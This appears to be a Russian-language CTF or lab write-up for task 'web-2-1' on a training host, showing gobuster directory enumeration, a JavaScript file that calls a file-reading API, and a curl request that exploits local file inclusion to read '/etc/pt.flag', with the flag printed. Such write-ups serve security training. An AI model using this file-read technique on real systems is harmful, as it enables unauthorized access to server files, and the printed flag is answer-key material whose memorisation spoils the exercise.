# Отчёт по задачам web-2-1 -- LFI на узле www.edu.stf

## Метаданные

| Поле | Значение |
|:-----|:---------|
| Задача | web-2-1 (LFI) |
| Узел | www.edu.stf (10.124.1.235) |
| Категория | Web / LFI |

## Разведка

```bash
$gobuster dir -u http://www.edu.stf/ -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.edu.stf/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/api                  (Status: 301) [Size: 231] [--> http://www.edu.stf/api/]
/assets               (Status: 301) [Size: 234] [--> http://www.edu.stf/assets/]
/.htaccess            (Status: 403) [Size: 199]
/config               (Status: 200) [Size: 2148]
/index.php            (Status: 200) [Size: 2972]
/server-status        (Status: 403) [Size: 199]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Находим интересные директории: `/api`, `/assets` и `/config`.

## Поиск уязвимости

Затем перейдем на сайт и увидим в графе `DevTools:Network` файл `/assets/getLoad.js`:
```javascript
setInterval(() => {
    fetch('/api/read.php?file=/opt/cpu.txt')
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok: ' + response.statusText);
            }
            return response.text()
        })
        .then(data => {
            console.log(data);
        })
        .catch(error => {
            console.error('There has been a problem with your fetch operation:', error);
        });
}, 10000);
```

## Эксплуатация

Вот и потенциальное место LFI, просто поменяем ссылку на такую и найдем флаг:
```bash
curl "http://www.edu.stf/api/read.php?file=/etc/pt.flag"
```

*Вывод*
```bash
9e882d6a-e9d4-4564-9aab-2c276315943e
```



